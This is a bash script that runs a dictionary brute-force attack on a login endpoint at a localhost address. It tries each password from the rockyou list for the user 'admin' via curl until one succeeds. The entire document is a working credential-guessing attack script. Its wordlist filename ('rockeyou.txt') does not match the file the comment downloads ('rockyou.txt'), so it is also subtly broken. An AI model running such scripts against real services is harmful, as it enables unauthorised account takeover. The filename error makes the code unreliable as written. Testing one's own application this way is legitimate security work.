#!/bin/bash
# to use this script, you must download the file locally with the following command:
# wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
# make sure to make this script executable with: chmod +x brute-force-password.sh

# Set target URL and username
url="http://127.0.0.1:5180/login"
username="admin"

# Path to the password dictionary
password_dictionary="rockeyou.txt"

# Content type for JSON requests
content_type="Content-Type: application/json"

# Iterate through the password dictionary and attempt login
while read -r password; do
    echo "Trying password: $password"
    
    # Prepare JSON data
    data="{\"username\":\"$username\",\"password\":\"$password\"}"
    
    # Send login request with JSON data and capture response headers
    response=$(curl -s -w "%{http_code}" -X POST "$url" -H "$content_type" -d "$data")
    http_status_code="${response: -3}"
    response_body="${response%$http_status_code}"

    # Check if the login was successful (HTTP status code 200)
    if [[ $http_status_code == "200" ]]; then
        echo "Password found: $password"
        break
    # Check if the password is incorrect (HTTP status code 401)
    elif [[ $http_status_code == "401" ]]; then
        echo "Incorrect password: $password"
    else
        echo "Unexpected status code: $http_status_code"
    fi
done < "$password_dictionary"
